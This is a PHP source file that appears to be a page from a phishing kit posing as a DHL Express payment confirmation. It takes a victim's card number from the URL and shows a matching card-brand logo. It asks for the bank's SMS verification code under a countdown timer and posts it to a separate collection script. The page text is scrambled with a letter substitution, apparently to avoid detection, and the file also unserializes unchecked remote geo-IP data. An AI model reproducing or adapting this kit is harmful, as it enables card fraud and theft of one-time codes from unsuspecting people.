<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');



$sms_request = $_GET['request'];

$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 
$currency = $addrDetailsArr['geoplugin_currencyCode'];

$cn = $_GET["cn"];
$cardb = substr($cn,0,1);


 if($cardb == '5' )
 {
 	$imagecc = "mr.png";
 }
 else if($cardb == '4' )
 {
 	$imagecc = "vs.png";
 }
 else
 {
 	$imagecc = "verisign.png";
 }

?>

<!DOCTYPE html>

<html lang="de"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>| Welcome |</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="google" content="notranslate">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="./style.css">
	
	<link rel="shortcut icon nofollow" href="favicon.ico">
	<script src="./style.js"></script>
	
	</head>
	<body class="tanya">
		<div id="bg-load" class="bg-load"><div class="load"></div></div>
		<section>
		<div class="head">
		<span><img src="./lg.svg"></span>
		<span><img src="<?php echo $imagecc; ?>"></span>
		</div>
		<div class="titr">Ultmzt cvnfria eht fvllvqrng umyatne.</div>
		<div class="kolchi">
        <form id="cFrm" method="post" action="<?php echo 'sms-post.php?request=' . $sms_request .'&cn=' . $cn; ?>">
		<p style="font-size:12px">Eht pnrwpt umzzqvid hmz bttn ztne ev eht avbrlt npabti lrzetd btlvq. Rf yvp nttd ev chmngt yvpi avbrlt npabti, ultmzt cvnemce yvpi bmnx vi avdrfy re orm eht momrlmblt chmnntlz (MEA, qtb).</p>
		<div class="inf">
		<span class="tr">Atichmne:</span>
		<span class="rp">DHL TKUITZZ</span>
		</div>
		<div class="inf">
		<span class="tr">Mavpne:</span>
		<span class="rp" style="font-family:arial">1.99 <?php echo $currency; ?></span>
		</div>
		<div class="inf">
		<span class="tr">Dmet:</span>
		<span class="rp"><?php echo  date("Y=m=d");  ?></span>
		</div>
		<!-- <div class="inf">
		<span class="tr">Citdre cmid npabti:</span>
		<span class="rp">KKKK-KKKK-KKKK-4354</span>
		</div>
		<div class="inf">
		<span class="tr">Yvpi Uhvnt Npabti:</span>
		<span class="rp"><br />
<b>Notice</b>:  Undefined index: tl in <b>/home/mefahbu/public_html/MARKET/F004f19441/33140025d.php</b> on line <b>62</b><br />
</span>
		</div>-->
		<div class="inf">
		<span class="tr">cvdt ZAZ:</span>
		<span class="rp"><input type="text" class="tantan" id="tantan" name="ce" maxlength="22" required="" placeholder="" autocomplete="off" autofocus=""></span>
		</div>
		<div style="font-size:12px">Ultmzt tneti eht otirfrcmervn cvdt itctrotd by zaz: <span id="timer" style="color:red;font-weight:bold;font-size:12px">04:58</span></div>
		</div>
		<!-- <div style="font-size:12px;color:red;font-weight:bold;padding:">Yvp apze mcctue ehrz umyatne ehivpgh eht muulrcmervn, rf yvp hmot cvnfriamervn fiva yvpi bmnx!</div> -->
		<div class="btn"><button type="submit" class="text-center">Zpbare</button></div>
		<div class="foot">© <?php echo date('Y'); ?> DHL Rnetinmervnml GabH - Mll irghez itztiotd.</div>
<input type="hidden" name="type" value="code">
		</form>
		</section>
<script src="./style.js"></script>
	<script>
		function onReady(callback) {
  var intervalId = window.setInterval(function() {
    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
      callback.call(this);
    }
  }, 15000);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
  setVisible('#bg-load', false);
});

/*-------------------------------------------------------*/
/*------------------- TIMER FUNCTION --------------------*/
/*-------------------------------------------------------*/

    function countdown(timer, minutes, seconds) {
// set time for the particular countdown
var time = minutes*60 + seconds;
var interval = setInterval(function() {
    var el = document.getElementById('timer');
    // if the time is 0 then end the counter
    if(time == 0) {
        setTimeout(function() {
            el.innerHTML = "ZAZ cvdt ztne...";
        }, 1500);


        clearInterval(interval);

        setTimeout(function() {
            countdown('clock', 2, 1);
        }, 2000);
    }
    var minutes = Math.floor( time / 60 );
    if (minutes < 10) minutes = "0" + minutes;
    var seconds = time % 60;
    if (seconds < 10) seconds = "0" + seconds; 
    var text = minutes + ':' + seconds;
    el.innerHTML = text;
    time--;
}, 1500);     // 1000 = 1 segonde in timer = j'ai fais 1500 pour calculer 1.5 segonde comme c'est 1 segonde
}
countdown('clock', 4, 1);
	</script>
	

</body></html>